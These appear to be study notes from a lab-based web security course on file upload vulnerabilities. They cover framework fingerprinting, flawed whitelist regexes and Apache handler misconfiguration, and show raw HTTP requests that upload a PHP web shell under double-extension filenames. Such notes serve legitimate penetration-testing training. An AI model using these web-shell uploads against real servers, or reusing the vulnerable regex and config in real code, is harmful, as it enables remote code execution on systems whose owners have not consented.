# Absent Validation
The most basic type of file upload vulnerability occurs when the web application `does not have any form of validation filters` on the uploaded files, allowing the upload of any file type by default.

## Identifying Web Framework

One easy method to determine what language runs the web application is to visit the `/index.ext` page, where we would swap out `ext` with various common web extensions, like `php`, `asp`, `aspx`, among others, to see whether any of them exist.

Several other techniques may help identify the technologies running the web application, like using the [Wappalyzer](https://www.wappalyzer.com/) extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:

![[Pasted image 20251013173409.png]]

# Whitelist Filters

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

We see that the script uses a Regular Expression (`regex`) to test whether the filename contains any whitelisted image extensions. The issue here lies within the `regex`, as it only checks whether the file name `contains` the extension and not if it actually `ends` with it.

## Double Extensions

For example, if the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.

```http
POST /upload.php HTTP/1.1
Host: 94.237.120.112:51381
Content-Length: 236

... SNIP ...

------WebKitFormBoundaryk8nV6IHO4X8lin32
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpeg.php"
Content-Type: image/jpeg

<?php system("id"); system($_GET[0]); ?>

------WebKitFormBoundaryk8nV6IHO4X8lin32--
```

However, this may not always work, as some web applications may use a strict `regex` pattern, as mentioned earlier, like the following:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

## Reverse Double Extension

In some cases, the file upload functionality itself may not be vulnerable, but the web server configuration may lead to a vulnerability.

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

The above configuration is how the web server determines which files to allow PHP code execution. It specifies a whitelist with a regex pattern that matches `.phar`, `.php`, and `.phtml`. However, this regex pattern can have the same mistake we saw earlier if we forget to end it with (`$`)

```http
POST /upload.php HTTP/1.1
Host: 94.237.120.112:51381
Content-Length: 236

... SNIP ...

------WebKitFormBoundaryk8nV6IHO4X8lin32
Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.jpeg"
Content-Type: image/jpeg

<?php system("id"); system($_GET[0]); ?>

------WebKitFormBoundaryk8nV6IHO4X8lin32--
```